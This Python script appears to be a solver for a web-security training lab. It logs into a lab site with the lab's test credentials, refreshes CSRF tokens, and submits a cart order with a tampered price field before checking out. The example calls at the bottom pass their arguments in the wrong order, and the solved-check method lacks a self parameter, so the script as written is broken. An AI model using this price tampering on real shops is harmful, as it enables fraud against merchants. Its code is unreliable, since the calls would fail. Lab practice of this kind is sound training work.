#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup


class WebsiteClient:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.csrf_token = None

    def login(self, username, password):
        login_page = self.session.get(f"{self.base_url}/login")
        login_page.raise_for_status()  # Check if the request was successful

        # Step 2: Parse the CSRF token
        soup = BeautifulSoup(login_page.text, "html.parser")
        self.csrf_token = soup.find("input", {"name": "csrf"}).get("value")

        # Step 3: Submit the login request with the CSRF token
        login_url = f"{self.base_url}/login"
        login_data = {
            "username": username,
            "password": password,
            "csrf": self.csrf_token,  # Use the fetched CSRF token
        }
        response = self.session.post(login_url, data=login_data)

        if response.status_code in [200, 302]:
            print("Login successful")
        else:
            print("Login failed")
            response.raise_for_status()

    def update_csrf_token(self):
        """Fetch a page and update the CSRF token from the HTML content."""
        response = self.session.get(f"{self.base_url}/login")
        response.raise_for_status()  # Check if the request was successful

        soup = BeautifulSoup(response.text, "html.parser")
        csrf_token = soup.find("input", {"type": "hidden", "name": "csrf"}).get("value")

        if csrf_token:
            self.csrf_token = csrf_token
        else:
            raise ValueError("CSRF token not found in the page")

    def make_request(
        self, method: str, path: str, query: dict = {}, data: dict = {}
    ) -> requests.Response:
        endpoint = path.lstrip("/")
        url = f"{self.base_url}/{endpoint}"
        print(f"Making {method} request to {url}")

        if method.upper() == "GET":
            response = self.session.get(url)
        elif method.upper() == "POST":
            self.update_csrf_token()  # Fetch and update CSRF token

            if self.csrf_token and data is not None:
                data["csrf"] = self.csrf_token

            response = self.session.post(url, data=data)  # Make the POST request
        else:
            raise ValueError("Unsupported method")

        return response

    def check_lab_solved(html_content):
        """
        Check if the lab was solved based on the HTML content.
        """
        soup = BeautifulSoup(html_content, "html.parser")

        # Check for specific phrases or classes that indicate the lab is solved
        solved_banner = soup.find_all(class_="is-solved")
        congratulations_message = soup.find_all(
            string="Congratulations, you solved the lab!"
        )

        if solved_banner or congratulations_message:
            return True
        else:
            return False


if __name__ == "__main__":
    # Example usage
    base_url = "https://0a21001103ea137d82c5ce0600d400c3.web-security-academy.net"
    client = WebsiteClient(base_url)
    client.login("wiener", "peter")

    # Make a GET request
    response = client.make_request("my-account?id=wiener")
    print(response.text)

    # Make a POST request
    post_data = {"productId": "1", "redir": "PRODUCT", "quantity": "1", "price": "1337"}
    response = client.make_request("cart", method="POST", data=post_data)
    print(response)

    post_data = {}
    response = client.make_request("cart/checkout", method="POST", data=post_data)
    print(response.text)

    print("Check if the lab is solved")
    print(WebsiteClient.check_lab_solved(response.text))
